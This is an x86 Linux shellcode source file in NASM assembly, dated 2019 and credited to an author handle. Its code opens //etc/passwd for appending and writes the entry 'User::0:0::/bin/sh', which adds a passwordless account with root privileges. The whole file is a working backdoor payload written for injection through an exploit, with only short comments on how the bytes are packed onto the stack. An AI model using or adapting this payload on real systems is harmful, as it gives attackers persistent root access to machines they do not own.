; Filename: adduser_big.nasm - 74 bytes
; Date: 12th October 2019
; Author:  @bolonobolo
; Web:  https://blackcloud.me
; Tested on: Linux x86

global _start			

section .text
_start:

	xor ebx, ebx
        xor ecx, ecx
        mov cx, 0x401
        mul ebx                           ; this put 0 in eax and edx
        mov [esp-4], ebx                  ; same as push
        mov dword [esp-8], 0x64777373     ; same as push
        mov dword [esp-12], 0x61702f63    ; same as push
        mov dword [esp-16], 0x74652f2f    ; same as push
        sub esp, 16
        lea ebx, [esp]                    ; same as mov the stack pointer to ebx
        mov al, 0x5
        int 0x80
        xchg ebx, eax                     ; move fd pointer in ebx
        mul edx                           ; this put 0 in eax and edx
        mov dword [esp-4], 0x68732f6e     ; hs/nib/:/::0:0::resU
        mov dword [esp-8], 0x69622f3a     ;
        mov dword [esp-12], 0x2f3a3a30    ;
        mov dword [esp-16], 0x3a303a3a    ;
        mov dword [esp-20], 0x72657355    ;
        sub esp, 20
        lea ecx, [esp]                    ; same as mov the stack pointer to ecx
        mov dl, 0x14
        mov al, 0x4
        int 0x80                    ; exit syscall now, the close syscall isn't necessary
        sub al, 0x13                ; write return the number of byte written (14) 14 - 13 = 1
        int 0x80  
